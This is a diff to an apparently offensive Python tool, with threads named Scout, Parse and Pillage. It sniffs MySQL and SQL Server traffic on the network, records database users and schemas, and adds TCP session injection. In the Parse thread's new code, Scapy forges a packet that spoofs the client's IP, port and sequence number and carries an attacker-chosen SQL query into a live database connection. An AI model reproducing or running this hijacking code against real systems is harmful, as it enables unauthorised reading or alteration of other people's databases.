@@ -7,11 +7,7 @@ path.append("databases/")
 from constantvalues import *
 import mysql,sqlserver
 
-#mysql = mysql.MySqlDB()
-#sqlserver = sqlserver.SqlServerDB()
-
-#databaseList = {MYSQL:mysql.MySqlDB(), SQLSERV:sqlserver.SqlServerDB()}
-databaseList = {SQLSERV:sqlserver.SqlServerDB(), MYSQL:mysql.MySqlDB()}
+databaseList = {MYSQL:mysql.MySqlDB(), SQLSERV:sqlserver.SqlServerDB()}
 
 pkts=Queue()
 queries=Queue()
@@ -23,26 +19,27 @@ class Traffic():
 		self.timestamp = datetime.datetime.now()
 
 class Conn():
-    def __init__(self,cip,cport,sip,sport,nextcseq=-1,nextsseq=-1,db=UNKNOWN):
-        self.cip     = cip
-        self.cport   = cport
-        self.sip     = sip
-        self.sport   = sport
-        self.db      = db
-        self.traffic = []
-        self.frag    = []
-        #unused; implement later to increase dropped/out of order/redundant packet fault tolerance and for TCP injection support
+    def __init__(self,cip,cport,sip,sport,state,nextcseq=-1,nextsseq=-1,db=UNKNOWN):
+        self.cip      = cip
+        self.cport    = cport
+        self.sip      = sip
+        self.sport    = sport
+        self.db       = db
+        self.traffic  = []
+        self.frag     = []
+        self.state    = state
         self.nextcseq = nextcseq
         self.nextsseq = nextsseq
 
 class DataBase():
-    def __init__(self,ip,port,dbType,name=UNKNOWN):
+    def __init__(self,ip,port,dbType):
         self.ip      = ip
         self.port    = port
-        self.name    = name
+        self.name    = ''
         self.dbType  = dbType
         self.traffic = []
-        self.users   = [] #unused currently
+        self.users   = []
+        self.schemas  = []
 
     def getType(self):
         if ISMYSQL(self.dbType):
@@ -52,11 +49,22 @@ class DataBase():
         else:
             return 'Unknown'
 
-    def getName(self):
-        if self.name == UNKNOWN:
-            return "Unknown"
+    def addUser(self,u):
+        if u not in self.users:
+            self.users.append(u)
+
+    def addSchema(self,s):
+        if s not in self.schemas:
+            self.schemas.append(s)
+
+    def getSchemas(self):
+        if len(self.schemas) == 0:
+            return "None identified"
         else:
-            return self.name
+            ret = ''
+            for s in self.schemas:
+                ret += '%s, '%s
+            return ret[:-2]
 
     def status(self):
         res = "---%s:%s---\n"%(self.ip,self.port)
@@ -68,7 +76,7 @@ class DataBase():
             res = res[:-2]+"\n"
         else:
             res += "no users identified yet\n"
-        res += "Schema:\t%s\n"%self.getName()
+        res += "Schema:\t%s\n"%self.getSchemas()
         res += "\nIdentified traffic:\n"
         for t in self.traffic:
             res += 'Query:\n\t%s\n'%t.query
@@ -86,6 +94,7 @@ class Parse(threading.Thread):
         self.res = ''
         self.knownConns = []
         self.knownDBs = []
+        self.inject = []
         with open('out.txt','w') as f:
             f.write('')
 
@@ -116,45 +125,15 @@ class Parse(threading.Thread):
 
         return pktType
 
-        #pktType = mysql.isDB(pkt)
-        #if pktType == UNKNOWN:
-        #    pktType = self.isSqlServ(pkt)
-        #return pktType
-
     def parse(self,pkts,conn):
         payload = ''
         for p in pkts:
             payload += str(p[TCP].payload)
 
-    	#this if statement should never be true
-        #db = conn.db
-        #if db.dbType == UNKNOWN:
-        #    pktType = self.fingerprint(payload)
-
         if pkts[0][IP].src == conn.sip and pkts[0][TCP].sport == conn.sport: #is response
             self.store(databaseList[conn.db.dbType].parseResp(payload,conn),conn.db.dbType*RESPONSE,conn)
         else: #is request
             self.store(databaseList[conn.db.dbType].parseReq(payload,conn),conn.db.dbType*REQUEST,conn)
-
-    	#if ISSQLSERV(db.dbType):
-        #    if pkts[0][IP].src == db.ip and pkt[TCP].sport == db.port:
-        #        pktType = SQLSERVRESP
-        #    else:
-        #        pktType = SQLSERVREQ
-        #elif ISMYSQL(db.dbType):
-        #    if pkts[0][IP].src == db.ip and pkts[0][TCP].sport == db.port:
-        #        pktType = MYSQLRESP
-        #    else:
-        #        pktType = MYSQLREQ
-
-        #if pktType == MYSQLREQ:
-        #    self.store(mysql.parseReq(payload,conn),MYSQLREQ,conn)
-        #elif pktType == MYSQLRESP:
-        #    self.store(mysql.parseResp(payload,conn),MYSQLRESP,conn)
-        #elif pktType == SQLSERVREQ:
-        #    self.parseSqlServReq(payload,conn)
-        #elif pktType == SQLSERVRESP:
-        #    self.parseSqlServResp(payload,conn)
 
     def inConn(self,c,pkt):
         if c.cip == pkt[IP].dst and c.cport == pkt[TCP].dport and c.sip == pkt[IP].src and c.sport == pkt[TCP].sport:
@@ -169,19 +148,19 @@ class Parse(threading.Thread):
 
     def isKnownDB(self,pkt):
         for db in self.knownDBs:
-            if pkt[IP].dst == db.ip and pkt[TCP].dport == db.port and db.name == UNKNOWN:
+            if pkt[IP].dst == db.ip and pkt[TCP].dport == db.port: #and db.name == UNKNOWN: TODO: commment code better. why the fuck am i checking if db is unknown?
                 return db
-            if pkt[IP].src == db.ip and pkt[TCP].sport == db.port and db.name == UNKNOWN:
+            if pkt[IP].src == db.ip and pkt[TCP].sport == db.port: #and db.name == UNKNOWN:
                 return db
 
-    def addConn(self,pkt,db=None):
+    def addConn(self,pkt,db=None,state=ESTABLISHED):
         if db:
             if pkt[IP].dst == db.ip and pkt[TCP].dport == db.port: #isReq
-                c = Conn(pkt[IP].src,pkt[TCP].sport,pkt[IP].dst,pkt[TCP].dport,nextcseq=len(pkt[TCP].payload)+pkt[TCP].seq,db=db)
+                c = Conn(pkt[IP].src,pkt[TCP].sport,pkt[IP].dst,pkt[TCP].dport,nextcseq=len(pkt[TCP].payload)+pkt[TCP].seq,db=db,state=state)
             elif pkt[IP].src == db.ip and pkt[TCP].sport == db.port: #isResp
-                c = Conn(pkt[IP].dst,pkt[TCP].dport,pkt[IP].src,pkt[TCP].sport,nextsseq=len(pkt[TCP].payload)+pkt[TCP].seq,db=db)
+                c = Conn(pkt[IP].dst,pkt[TCP].dport,pkt[IP].src,pkt[TCP].sport,nextsseq=len(pkt[TCP].payload)+pkt[TCP].seq,db=db,state=state)
         else:
-            c = Conn(pkt[IP].src,pkt[TCP].sport,pkt[IP].dst,pkt[TCP].dport,nextcseq=pkt[TCP].seq+1)
+            c = Conn(pkt[IP].src,pkt[TCP].sport,pkt[IP].dst,pkt[TCP].dport,nextcseq=pkt[TCP].seq+1,state=state)
 
         self.knownConns.append(c) 
         return c   	
@@ -203,13 +182,31 @@ class Parse(threading.Thread):
         except:
             return
 
-        c = self.getConn(pkt)
+        #self.printLn('[*] pkt payload:\t%s'%self.readable(str(pkt[TCP].payload).encode('hex')))
+
+        c  = self.getConn(pkt)
+
+        if not queries.empty():
+            self.inject.append(queries.get())
+
+        if c:
+            for i in self.inject:
+                if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2] and pkt[TCP].flags == 24: #make sure injecting after db response and it isn't a fragged response
+                    #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
+                    #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
+                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/databaseList[c.db.dbType].encodeQuery(i[0]))
+                    self.inject.remove(i)
+
+        db = self.isKnownDB(pkt)
 
         if c and pkt[TCP].flags == 17: #FIN/ACK pkt, remove conn
             self.delConn(c)
             return
         elif pkt[TCP].flags == 2 and not c: #SYN pkt
-            c = self.addConn(pkt)
+            if db:
+                c = self.addConn(pkt,db,state=HANDSHAKE)
+            else:
+                c = self.addConn(pkt)
             c.nextcseq = pkt[TCP].seq+1
             return
         
@@ -220,7 +217,10 @@ class Parse(threading.Thread):
         if not c: #check if conn is being made to a known DB
             db = self.isKnownDB(pkt)
             if db:
+                self.printLn("[*] connecting to known db")
                 c = self.addConn(pkt,db)
+            else:
+                self.printLn("[*] connecting to unknown server")
 
         ip, port, dbType = None, None, None
 
@@ -374,8 +374,7 @@ class Pillage(threading.Thread):
         while not self.die:
             if not queries.empty():
                 q = queries.get()
-                print('[*] Executing query:\t%s'%q[0])
-                print('[*] Targeting:\t%s'%q[1])
+
 
 def writeResults(t):
     print('[*] Enter filepath to write to:')
@@ -389,12 +388,14 @@ def pillage():
     global queries
     print('[*] Enter query to execute:')
     query = raw_input("> ")
-    print('[*] Enter IP:port to execute against:')
-    dst = raw_input("> ")
-    print('[*] Run %s against %s? [y/n]'%(query,dst))
+    print('[*] Enter IP to execute against:')
+    ip = raw_input("> ")
+    print('[*] Enter port to execute against:')
+    port = raw_input("> ")
+    print('[*] Run "%s" against %s:%s? [y/n]'%(query,ip,port))
     ans = raw_input("> ")
     if ans == 'y':
-        queries.put([query,dst])
+        queries.put([query,ip,port])
         print('[*] Query will run as soon as possible')
     else:
         print('[*] Cancelling...')
@@ -450,10 +451,10 @@ def main():
 
     t1 = Scout()
     t2 = Parse()
-    t3 = Pillage()
+    #t3 = Pillage()
     t1.start()
     t2.start()
-    t3.start()
+    #t3.start()
 
     while True:
         printMainMenu(t2)
@@ -463,7 +464,7 @@ def main():
             print('\n[!] Shutting down...')
             t1.die = True
             t2.die = True
-            t3.die = True
+            #t3.die = True
             break
 
         #except:
